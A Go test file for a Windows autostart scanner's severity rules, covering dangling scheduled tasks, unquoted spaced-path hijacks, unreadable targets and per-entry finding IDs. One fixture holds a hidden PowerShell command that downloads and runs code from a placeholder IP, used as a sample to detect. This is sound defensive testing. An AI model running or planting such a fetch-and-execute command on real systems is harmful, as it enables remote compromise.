package engine

import (
	"strings"
	"testing"

	"github.com/co2water/agentegress/internal/collect"
	"github.com/co2water/agentegress/internal/snapshot"
)

// Regressions from the winget moderator's run on a clean test VM (2026-11-04).

var gone = &collect.Signature{Status: collect.SigError, Detail: collect.DetailMissing}

// danglingTasks mirrors the VM: two machine-scope tasks, one per purpose,
// pointing at the same updater under a user's AppData that is not there.
func danglingTasks(sig *collect.Signature) []snapshot.Autostart {
	const exe = `C:\Users\alice\AppData\Local\Example\ExampleUpdater.exe`
	mk := func(name string) snapshot.Autostart {
		return snapshot.Autostart{Autostart: collect.Autostart{Kind: "scheduled-task", Scope: "machine",
			Location: name, Name: name, Command: exe + " /reporting", Target: exe}, Signature: sig, UserDir: true}
	}
	return []snapshot.Autostart{mk(`\Example Reporting Task-S-1-5-21-1-2-3-1001`), mk(`\Example Update Task-S-1-5-21-1-2-3-1001`)}
}

// Item 1: a missing target is low, not high, so a clean machine is not an
// alert. The VM's tasks name the file through %LOCALAPPDATA% and may run as
// another account, which makes them medium.
func TestWingetDanglingAutostartIsLow(t *testing.T) {
	s := fixture()
	s.Autostarts = danglingTasks(gone)
	f := expect(t, s, "H4", Low, Low)
	if r := Evaluate(s); r.Verdict != VerdictReview {
		t.Errorf("verdict = %v, want review", r.Verdict)
	}
	if !strings.Contains(f[0].Title, "does not exist") || strings.Contains(f[0].Detail, "nothing runs") {
		t.Errorf("title/detail = %q / %q", f[0].Title, f[0].Detail)
	}
	if f[0].File() != "" {
		t.Errorf("a missing file cannot bind an acknowledgement; file = %q", f[0].File())
	}

	// As on the VM: the command uses a per-user variable.
	for i := range s.Autostarts {
		s.Autostarts[i].Command = `%localappdata%\Example\ExampleUpdater.exe /reporting`
	}
	f = expect(t, s, "H4", Medium, Medium)
	if r := Evaluate(s); r.Verdict != VerdictReview {
		t.Errorf("verdict = %v, want review", r.Verdict)
	}
	if !strings.Contains(f[0].Detail, "another account") {
		t.Errorf("detail = %q", f[0].Detail)
	}

	// Outside a user-writable folder it is still low, never info: what a
	// command or shortcut names can be a decoy for what actually runs.
	s.Autostarts = []snapshot.Autostart{{Autostart: collect.Autostart{Kind: "service", Scope: "machine",
		Location: `HKLM\SYSTEM\CurrentControlSet\Services\OldSvc`, Name: "OldSvc", Command: `"C:\Program Files\Old\old.exe"`, Target: `C:\Program Files\Old\old.exe`}, Signature: gone}}
	expect(t, s, "H4", Low)

	// A missing payload behind a signed host program is the same case.
	s.Autostarts = []snapshot.Autostart{{Autostart: collect.Autostart{Kind: "run-key", Scope: "user", Name: "lib",
		Command: `rundll32.exe C:\Users\alice\AppData\Roaming\x.dll,Start`,
		Target:  `C:\Users\alice\AppData\Roaming\x.dll`, Host: `C:\Windows\System32\rundll32.exe`},
		Signature: gone, UserDir: true, HostSignature: signed}}
	expect(t, s, "H4", Low)

	// Code review: on a tie the file that is there wins, so a missing payload
	// does not hide an unreadable host (and an ack by ID would not cover it).
	s.Autostarts[0].Host = `C:\Program Files\Tools\loader.exe`
	s.Autostarts[0].Command = `"C:\Program Files\Tools\loader.exe" C:\Users\alice\AppData\Roaming\x.dll`
	s.Autostarts[0].HostSignature = &collect.Signature{Status: collect.SigError, Detail: "file missing or unreadable"}
	f = expect(t, s, "H4", Low)
	if strings.Contains(f[0].Title, "does not exist") || f[0].File() != s.Autostarts[0].Host {
		t.Errorf("tie picked the missing payload: %q file=%q", f[0].Title, f[0].File())
	}
}

// Acceptance review: an unquoted Run key or service command whose path has a
// space is resolved word by word, so a "missing" target can be the
// unquoted-path hijack. It keeps the full level; quoted, it is dangling.
func TestWingetUnquotedSpacedPathNotDowngraded(t *testing.T) {
	const exe = `C:\Users\alice\My Tools\x.exe`
	s := fixture()
	for _, kind := range []string{"run-key", "service"} {
		s.Autostarts = []snapshot.Autostart{{Autostart: collect.Autostart{Kind: kind, Scope: "user", Name: "tool",
			Command: exe + " --background", Target: exe}, Signature: gone, UserDir: true}}
		expect(t, s, "H4", High)
		s.Autostarts[0].Command = `"` + exe + `" --background`
		expect(t, s, "H4", Low)
	}
	// Re-review: the resolved target need not contain the space. Windows
	// tries "My.exe" first, then "My Apps\tool.exe"; only the first was checked.
	s.Autostarts = []snapshot.Autostart{{Autostart: collect.Autostart{Kind: "run-key", Scope: "user", Name: "tool",
		Command: `C:\Users\alice\My Apps\tool -x`, Target: `C:\Users\alice\My.exe`}, Signature: gone, UserDir: true}}
	expect(t, s, "H4", High)
	s.Autostarts[0].Command = `C:\Users\alice\x.exe tools\y.exe`
	s.Autostarts[0].Target = `C:\Users\alice\x.exe`
	expect(t, s, "H4", High)
	// One word before the switches is not ambiguous.
	s.Autostarts[0].Command = `C:\Users\alice\x.exe --background`
	expect(t, s, "H4", Low)
	// A service runs as a service account: its missing file in this user's
	// folders says little about that account's view (ServiceDll included).
	s.Autostarts = []snapshot.Autostart{{Autostart: collect.Autostart{Kind: "service", Scope: "machine", Name: "svc",
		Command: `C:\Windows\System32\svchost.exe -k netsvcs`, Target: `C:\Users\alice\AppData\Local\x.dll`}, Signature: gone, UserDir: true}}
	expect(t, s, "H4", Medium)

	// A scheduled task's program field is never split at spaces.
	s.Autostarts = []snapshot.Autostart{{Autostart: collect.Autostart{Kind: "scheduled-task", Scope: "machine", Name: `\Tool`,
		Location: `\Tool`, Command: exe, Target: exe}, Signature: gone, UserDir: true}}
	expect(t, s, "H4", Low)
}

// Item 1: only "missing" is lowered. A file that is there but unreadable
// stays high in a user folder, and a running process whose file was deleted
// after it started is not an autostart and stays high.
func TestWingetUnreadableAndRunningStayHigh(t *testing.T) {
	s := fixture()
	s.Autostarts = danglingTasks(&collect.Signature{Status: collect.SigError, Detail: "file missing or unreadable"})
	expect(t, s, "H4", High, High)

	s = fixture()
	s.Procs[70] = &snapshot.Proc{PID: 70, Name: "x.exe", Path: `C:\Users\alice\x.exe`, Signature: gone, UserDir: true, Readable: true}
	s.Conns = []snapshot.Conn{{PID: 70, External: true, Remote: "203.0.113.5:443"}}
	expect(t, s, "H1", High)
}

// Item 2: two entries starting the same file get different IDs, and a file
// that appears where a dangling entry pointed is a new finding.
func TestWingetH4IDsPerEntry(t *testing.T) {
	ids := func(sig *collect.Signature, want ...Severity) []string {
		s := fixture()
		s.Autostarts = danglingTasks(sig)
		var out []string
		for _, f := range expect(t, s, "H4", want...) {
			out = append(out, f.ID)
		}
		return out
	}
	missingIDs := ids(gone, Low, Low)
	presentIDs := ids(unsigned, High, High)
	if missingIDs[0] == missingIDs[1] || presentIDs[0] == presentIDs[1] {
		t.Errorf("entries share an ID: %v %v", missingIDs, presentIDs)
	}
	for _, m := range missingIDs {
		for _, p := range presentIDs {
			if m == p {
				t.Errorf("acknowledging the missing file would cover the file that replaced it: %s", m)
			}
		}
	}
}

// A task with the same action twice is one finding, not two with one ID.
func TestWingetRepeatedActionReportedOnce(t *testing.T) {
	s := fixture()
	a := danglingTasks(unsigned)[0]
	s.Autostarts = []snapshot.Autostart{a, a}
	expect(t, s, "H4", High)

	b := snapshot.Autostart{Autostart: collect.Autostart{Kind: "scheduled-task", Scope: "machine", Location: `\Updater`, Name: `\Updater`,
		Command: `powershell -w hidden -c "iex (irm http://203.0.113.9/p)"`, Target: `C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe`}, Signature: signed}
	s.Autostarts = []snapshot.Autostart{b, b}
	expect(t, s, "H6", High)

	// Same file named with and without a %VARIABLE%: the higher level stays.
	c := danglingTasks(gone)[0]
	d := c
	d.Command = `%localappdata%\Example\ExampleUpdater.exe`
	s.Autostarts = []snapshot.Autostart{c, d}
	expect(t, s, "H4", Medium)
}
